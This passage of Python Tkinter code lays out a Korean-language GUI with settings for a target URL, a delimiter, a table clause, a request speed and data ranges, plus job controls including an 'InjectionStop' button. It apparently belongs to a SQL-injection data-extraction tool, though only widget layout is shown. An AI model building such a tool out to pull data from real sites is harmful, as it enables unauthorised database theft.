    log_scroll.pack(side="right", fill="y")
    
    log_txt = Text(log_frame, width=640, state="disable", yscrollcommand=log_scroll.set)
    log_txt.pack(fill="both", padx=5, pady=0, ipady=5)
    log_scroll.config(command=log_txt.yview)
    
    #############################################################
    #기능 창                                                      #
    #############################################################   
    
    notebook = ttk.Notebook(pin_frame2)
    
    #설정 탭
    
    setting_tab = ttk.Frame(notebook)
    notebook.add(setting_tab, text="설정")

    lbl_name = ttk.Label(setting_tab, text="폴더 이름:")
    lbl_name.grid(row=0, column=0, pady=3)

    e_name = ttk.Entry(setting_tab, width=75)
    e_name.grid(row=0, column=1, pady=3)
    #E. 생성 폴더 이름
    e_name.insert(0, "acunetix")
    
    lbl_url = ttk.Label(setting_tab, text="Url:")
    lbl_url.grid(row=1, column=0, pady=3)

    e_url = ttk.Entry(setting_tab, width=75)
    e_url.grid(row=1, column=1, pady=3)
    e_url.insert(0, url)

    lbl_delim = ttk.Label(setting_tab, text="구분자:")
    lbl_delim.grid(row=2, column=0, pady=3)

    e_delim = ttk.Entry(setting_tab, width=75)
    e_delim.grid(row=2, column=1, pady=3)
    e_delim.insert(0, delims)

    lbl_count = ttk.Label(setting_tab, text="테이블 구문:")
    lbl_count.grid(row=3, column=0, pady=3)

    e_count = ttk.Entry(setting_tab, width=75)
    e_count.grid(row=3, column=1, pady=3)
    e_count.insert(0, rcount)
    
    lbl_speed = ttk.Label(setting_tab, text="속도(1/s):")
    lbl_speed.grid(row=4, column=0, pady=3)

    e_speed = ttk.Entry(setting_tab, width=75)
    e_speed.grid(row=4, column=1, pady=3)
    e_speed.insert(0, speed)
    
    lbl_data_count1 = ttk.Label(setting_tab, text="데이터 범위1:")
    lbl_data_count1.grid(row=5, column=0, pady=3)

    e_data_count1 = ttk.Entry(setting_tab, width=75)
    e_data_count1.grid(row=5, column=1, pady=3)
    e_data_count1.insert(0, data_C1)

    lbl_data_count2 = ttk.Label(setting_tab, text="데이터 범위2:")
    lbl_data_count2.grid(row=6, column=0, pady=3)

    e_data_count2 = ttk.Entry(setting_tab, width=75)
    e_data_count2.grid(row=6, column=1, pady=3)
    e_data_count2.insert(0, data_C2)

    #작업 탭
    
    work_tab = ttk.Frame(notebook)
    notebook.add(work_tab, text="작업")
    
    work_frame = Frame(work_tab, width=640, bd=2)
    work_frame.pack(fill="both", expand=True)
    
    work_scroll = ttk.Scrollbar(work_frame)
    work_scroll.pack(side="right", fill="y")
    
    work_txt = Listbox(work_frame, height=13, width=90, selectmode="extended", yscrollcommand=work_scroll.set)
    work_txt.pack(fill="y", padx=5, pady=0, ipady=5)
    work_scroll.config(command=work_txt.yview)
    
    button_frame = ttk.Frame(work_tab)
    button_frame.pack(fill="both", expand=True)
    
    start_button = ttk.Button(button_frame, text="시작", width=10, command=WorkStart)
    start_button.pack(side="left")
    
    stop_button = ttk.Button(button_frame, text="정지", width=10, command=InjectionStop)
    stop_button.pack(side="left")
    
    delete_button = ttk.Button(button_frame, text="삭제", width=10, command=WorkDelete)
    delete_button.pack(side="left")
    
    top_button = ttk.Button(button_frame, text="최상위로", width=10, command=WorkTop)
    top_button.pack(side="left")
    
    up_button = ttk.Button(button_frame, text="위로", width=10, command=WorkUp)
    up_button.pack(side="left")
    
    down_button = ttk.Button(button_frame, text="아래로", width=10, command=WorkDown)
    down_button.pack(side="left")
    
    reset_button = ttk.Button(button_frame, text="작업 초기화", width=10, command=WorkReset)
    reset_button.pack(side="left")
    
    notebook.pack(expand=True, fill="both", padx=5, pady=5)
    
    #############################################################
    #로그 창                                                      #
    #############################################################



    #############################################################
    #GUI 스타트                                                   #
    #############################################################
    root.mainloop()
